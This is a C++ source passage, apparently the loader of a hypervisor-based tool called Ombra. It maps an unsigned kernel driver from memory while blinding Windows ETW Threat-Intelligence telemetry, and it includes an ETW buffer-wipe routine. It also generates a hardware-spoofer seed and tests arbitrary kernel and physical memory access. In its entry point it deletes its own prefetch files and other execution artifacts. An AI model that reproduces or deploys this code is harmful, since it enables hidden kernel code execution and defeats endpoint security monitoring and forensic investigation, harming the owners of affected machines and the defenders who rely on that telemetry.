    DbgLog("[*] Phase 6: Checking driver status...\n");

    // Phase 3: Resolve ETW-TI parameters for telemetry blinding
    auto etwParams = etw::ResolveEtwParameters();
    if (etwParams.success) {
        DbgLog("[+] ETW-TI resolved: ntoskrnl=0x%llX offset=0x%llX (build %u)",
            etwParams.ntoskrnl_base, etwParams.offset, etwParams.build_number);
    } else {
        DbgLog("[!] ETW-TI resolution failed (build %u) - continuing without blinding",
            etwParams.build_number);
    }

    DWORD64 callback = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::CALLBACK_ADDRESS);
    if (!callback)
    {
        DbgLog("[*] Driver not mapped - mapping OmbraDriver.sys...");

        // Phase 3: Blind ETW-TI during driver mapping
        u64 etw_saved_value = 0;
        bool etw_blinded = false;
        if (etwParams.success) {
            auto etwResult = ombra::disable_etw_ti(
                etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            etw_blinded = (etwResult == VMX_ROOT_ERROR::SUCCESS);
            if (etw_blinded) {
                DbgLog("[+] ETW-TI blinded (saved=0x%llX)", etw_saved_value);
            } else {
                DbgLog("[!] ETW-TI blinding failed: %llu", static_cast<u64>(etwResult));
            }
        }

        ULONG64 driverBase = 0;

        USERMODE_INFO uInfo = { 0 };
        if (!setup::InitOffsets(uInfo.offsets))
        {
            DbgLog("[-] FATAL: Could not initialize offsets");
            if (etw_blinded) {
                ombra::enable_etw_ti(etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            }
            zerohvci::Cleanup();
            return -1;
        }

        uInfo.loaderProcId = GetCurrentProcessId();
        // Generate runtime spoofer seed (replaces hardcoded 0x4712abb3892)
        uInfo.spooferSeed = ombra_keygen::GenerateSpooferSeed();
        DbgLog("[+] Generated spoofer seed: 0x%llX", uInfo.spooferSeed);
        uInfo.vmcallKey = ombra::VMEXIT_KEY;

        // Try to load driver from embedded resource first (no disk footprint)
        std::vector<std::uint8_t> driverData = LoadDriverFromResource();
        NTSTATUS status;

        if (!driverData.empty())
        {
            // Use vector overload - driver loaded directly from memory
            status = mapper::map_driver(
                driverData,
                0,
                (ULONG64)&uInfo,
                true,
                false,
                &driverBase
            );
        }
        else
        {
            // Fallback to file loading for development/testing
            DbgLog("[*] Falling back to file-based driver loading...");
            status = mapper::map_driver(
                "OmbraDriver.sys",
                0,
                (ULONG64)&uInfo,
                true,
                false,
                &driverBase
            );
        }

        // Restore ETW-TI after mapping completes
        if (etw_blinded) {
            ombra::enable_etw_ti(etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            DbgLog("[+] ETW-TI restored");
        }

        DbgLog("[*] Driver map status: 0x%x", status);

        if (!NT_SUCCESS(status))
        {
            DbgLog("[-] FATAL: Driver mapping failed");
            mapper::kernel_ctx ctx;
            ctx.free_pool((void*)driverBase);
            zerohvci::Cleanup();
            return -1;
        }

        DbgLog("[+] OmbraDriver.sys mapped at: 0x%llX", driverBase);
    }
    else
    {
        DbgLog("[+] Driver already mapped (callback: 0x%llX)", callback);
    }

    //=== Phase 6.5: Auto ETW Buffer Wipe ===//
    // Wipe any ETW events generated during loading (before ETW-TI was blinded)
    u64 etw_timestamp_end = ombra::get_etw_timestamp();
    if (etwParams.success) {
        // EtwpLoggerList offset - build-specific, requires PDB or signature scan
        // TODO: Add EtwpLoggerList offset resolution to etw_resolver.h
        constexpr u64 ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER = 0;  // Needs build-specific value

        if (ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER != 0) {
            auto wipeResult = ombra::wipe_etw_buffers(
                etwParams.ntoskrnl_base,
                ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER,
                etw_timestamp_start,
                etw_timestamp_end
            );
            if (wipeResult.success) {
                DbgLog("[+] ETW buffers wiped: %u events from %u buffers",
                    wipeResult.events_wiped, wipeResult.buffers_scanned);
            } else {
                DbgLog("[!] ETW buffer wipe failed");
            }
        } else {
            DbgLog("[!] ETW buffer wipe skipped (EtwpLoggerList offset not configured)");
        }
    }

    //=== Phase 7: Verify callback registration ===//
    DbgLog("\n[*] Phase 7: Verifying callback registration...\n");

    callback = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::CALLBACK_ADDRESS);
    DbgLog("[+] Callback address: 0x%llX", callback);

    DWORD64 driverPa = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::DRIVER_BASE_PA);
    DbgLog("[+] Driver physical base: 0x%llX", driverPa);

    mapper::kernel_ctx ctx;
    ombra::storage_set(VMX_ROOT_STORAGE::CURRENT_CONTROLLER_PROCESS, ctx.get_peprocess(GetCurrentProcessId()));
    DbgLog("[+] Controller process registered: %p",
        ombra::storage_get<PEPROCESS>(VMX_ROOT_STORAGE::CURRENT_CONTROLLER_PROCESS));

    // Initialize VDM with callback
    vdm.Init(callback);

    // Test callback invocation
    KERNEL_REQUEST req;
    req.instructionID = INST_REGISTER_SCORE_NOTIFY;
    NTSTATUS ntStatus = -1;
    BOOLEAN bSuccess = vdm.CallKernelFunction(&ntStatus, callback, &req);
    DbgLog("[+] Callback test: success=%d status=0x%X", bSuccess, ntStatus);

    //=== Phase 8: Memory operation tests ===//
    DbgLog("\n[*] Phase 8: Memory operation tests...\n");

    DWORD64 value = 0xbeefbeef;
    DWORD64 valueWrite = 0xdeaddead;
    auto writeResult = ombra::write_virt((u64)&value, (u64)&valueWrite, sizeof(valueWrite), cr3);
    DbgLog("[+] Write virtual test: 0x%x", writeResult);
    DbgLog("[+] Value after write: 0x%llX (expected 0xDEADDEAD)", value);

    // Read from identity-mapped physical address
    DbgLog("[+] Physical 0x0: 0x%llX", *(DWORD64*)identity::phyToVirt(0));
    DbgLog("[+] Driver phys read: 0x%llX", *(DWORD64*)identity::phyToVirt(driverPa));

    //=== Complete ===//
    DbgLog("\n========================================");
    DbgLog("  Ombra Hypervisor ACTIVE (ZeroHVCI)");
    DbgLog("========================================");
    DbgLog("  Payload:    0x%llX", hijacker.GetPayloadBase());
    DbgLog("  Driver:     0x%llX (phys)", driverPa);
    DbgLog("  Callback:   0x%llX", callback);
    DbgLog("  VMCALL Key: 0x%llX", VMCALL_KEY);
    DbgLog("========================================\n");

    return 0;
}

#endif // USE_SUPDRV / USE_ZEROHVCI

//===----------------------------------------------------------------------===//
// Entry Point
//===----------------------------------------------------------------------===//

void PrintUsage()
{
    DbgLog("Usage: OmbraLoader.exe [options]");
    DbgLog("Options:");
    DbgLog("  --skip-hyperv-check, -s  Skip Microsoft hypervisor vendor check");
    DbgLog("                           (for nested virtualization testing)");
    DbgLog("  --help, -h               Show this help message");
}

int main(int argc, char* argv[])
{
    // Parse command-line arguments
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--skip-hyperv-check") == 0 || strcmp(argv[i], "-s") == 0)
        {
            g_SkipHyperVCheck = true;
            DbgLog("[*] Hypervisor vendor check will be skipped");
        }
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0)
        {
            PrintUsage();
            return 0;
        }
    }

    int result = Main();

    if (result == 0)
    {
        DbgLog("[+] Loader completed successfully");
    }
    else
    {
        DbgLog("[-] Loader failed with code %d", result);
    }

    //=== Phase 3: Prefetch Cleanup ===//
    // Clean up prefetch files that record loader execution
    DbgLog("\n[*] Cleaning up execution traces...");
    auto prefetchResult = prefetch::CleanupOwnPrefetch();
    auto artifactResult = prefetch::CleanupKnownArtifacts();

    int totalCleaned = prefetchResult.files_deleted + artifactResult.files_deleted;
    int totalFailed = prefetchResult.files_failed + artifactResult.files_failed;

    if (totalCleaned > 0 || totalFailed > 0) {
        DbgLog("[+] Prefetch cleanup: %d deleted, %d failed", totalCleaned, totalFailed);
    } else {
        DbgLog("[*] No prefetch files found to clean");
    }

    system("pause");
    return result;
}
